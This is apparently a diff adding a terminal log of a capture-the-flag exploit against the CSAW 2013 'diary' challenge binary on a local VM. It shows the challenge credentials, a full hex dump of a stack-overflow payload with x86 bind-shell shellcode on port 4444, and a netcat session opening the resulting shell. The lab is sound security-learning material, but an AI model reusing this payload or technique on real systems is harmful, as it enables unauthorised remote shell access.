@@ -1,0 +1,96 @@
+user@ubuntuvm:~/Desktop/csaw_diary$ python exploit.py
+[+] Starting program './fil_chal': Done
+[*] Security settings for 'fil_chal':
+    RELRO:         Full RELRO
+    Stack Canary:  No canary found
+    NX:            NX disabled
+    PIE:           No PIE
+    RPATH:         No RPATH
+    RUNPATH:       No RUNPATH
+[+] Opening connection to 127.0.0.1 on port 34266: Done
+[DEBUG] Received 0x2b5 bytes:
+    '     *************    $$$$$$$$$        AAAAAAA  *****                   *****\n'
+    '    *   *******  *    $ $$   $$        A     A   *   *                 *   * \n'
+    '    *  *       ***     $ $   $$       A  A A  A   *   *               *   *  \n'
+    '    *  *                $ $          A  A___A  A   *   *             *   *   \n'
+    '    *  *                 $ $        A           A   *   *    ****   *   *\n'
+    '    *  *                  $ $      A     AAA     A   *   *   *  *  *   *\n'
+    '    *  *       ***         $ $     A    A   A    A    *   ***   ***   *\n'
+    '    *  ********  *   $$$$$$   $    A    A   A    A     *             * \n'
+    '     *************   $$$$$$$$$$    AAAAAA   AAAAAA      ************* \n'
+    '\t\tDairy\n'
+    '\n'
+    'UserName: '
+[DEBUG] Sent 0x9 bytes:
+    'csaw2013\n'
+[DEBUG] Received 0xa bytes:
+    'Password: '
+[DEBUG] Sent 0xa bytes:
+    'S1mplePWD\n'
+[DEBUG] Received 0x26 bytes:
+    'Welcome!\n'
+    'http://youtu.be/KmtzQCSh6xk\n'
+    '\n'
+[DEBUG] Received 0xc bytes:
+    'Entry Info: '
+[DEBUG] Sent 0x6 bytes:
+    '65535\n'
+[DEBUG] cpp -C -nostdinc -undef -P -I/home/user/Desktop/binjitsu/pwnlib/data/includes /dev/stdin
+[DEBUG] Assembling
+    .org 0x0
+    .section .shellcode,"ax"
+    .intel_syntax noprefix
+        nop
+[DEBUG] /usr/bin/i386-linux-gnu-as -32 -o /tmp/pwn-asm-50Hbcv/step2 /tmp/pwn-asm-50Hbcv/step1
+[DEBUG] /usr/bin/i386-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-50Hbcv/step2 /tmp/pwn-asm-50Hbcv/step3
+[*] Sending payload:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    *
+    00000420  e0 86 04 08  10 91 04 08  04 00 00 00  00 b0 04 08  │····│····│····│····│
+    00000430  02 00 00 00  00 b0 04 08  90 90 90 90  90 90 90 90  │····│····│····│····│
+    00000440  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+    *
+    00000490  90 90 90 90  90 90 90 90  90 90 90 90  31 db f7 e3  │····│····│····│1···│
+    000004a0  53 43 53 6a  02 89 e1 b0  66 cd 80 5b  5e 52 68 02  │SCSj│····│f··[│^Rh·│
+    000004b0  00 11 5c 6a  10 51 50 89  e1 6a 66 58  cd 80 89 41  │··\j│·QP·│·jfX│···A│
+    000004c0  04 b3 04 b0  66 cd 80 43  b0 66 cd 80  93 59 6a 3f  │····│f··C│·f··│·Yj?│
+    000004d0  58 cd 80 49  79 f8 68 2f  2f 73 68 68  2f 62 69 6e  │X··I│y·h/│/shh│/bin│
+    000004e0  89 e3 50 53  89 e1 b0 0b  cd 80                     │··PS│····│··│
+    000004ea
+[DEBUG] Sent 0x4ea bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    *
+    00000420  e0 86 04 08  10 91 04 08  04 00 00 00  00 b0 04 08  │····│····│····│····│
+    00000430  02 00 00 00  00 b0 04 08  90 90 90 90  90 90 90 90  │····│····│····│····│
+    00000440  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+    *
+    00000490  90 90 90 90  90 90 90 90  90 90 90 90  31 db f7 e3  │····│····│····│1···│
+    000004a0  53 43 53 6a  02 89 e1 b0  66 cd 80 5b  5e 52 68 02  │SCSj│····│f··[│^Rh·│
+    000004b0  00 11 5c 6a  10 51 50 89  e1 6a 66 58  cd 80 89 41  │··\j│·QP·│·jfX│···A│
+    000004c0  04 b3 04 b0  66 cd 80 43  b0 66 cd 80  93 59 6a 3f  │····│f··C│·f··│·Yj?│
+    000004d0  58 cd 80 49  79 f8 68 2f  2f 73 68 68  2f 62 69 6e  │X··I│y·h/│/shh│/bin│
+    000004e0  89 e3 50 53  89 e1 b0 0b  cd 80                     │··PS│····│··│
+    000004ea
+[DEBUG] cpp -C -nostdinc -undef -P -I/home/user/Desktop/binjitsu/pwnlib/data/includes /dev/stdin
+[DEBUG] Assembling
+    .org 0x0
+    .section .shellcode,"ax"
+    .intel_syntax noprefix
+    jmp esp
+[DEBUG] /usr/bin/i386-linux-gnu-as -32 -o /tmp/pwn-asm-VfGJCa/step2 /tmp/pwn-asm-VfGJCa/step1
+[DEBUG] /usr/bin/i386-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-VfGJCa/step2 /tmp/pwn-asm-VfGJCa/step3
+[DEBUG] Sent 0x2 bytes:
+    00000000  ff e4                                               │··│
+    00000002
+[*] Done, run netcat on 127.0.0.1:4444
+[*] Closed connection to 127.0.0.1 port 34266
+[*] Program './fil_chal' stopped with exit code 255
+user@ubuntuvm:~/Desktop/csaw_diary$ nc localhost 4444
+ls -l
+total 20
+-rwxr-x--x 1 user user 9552 Mar 14 04:36 fil_chal
+-rw-rw-r-- 1 user user 1567 Mar 14 13:24 exploit.py
+id
+uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
+^C
+user@ubuntuvm:~/Desktop/csaw_diary$
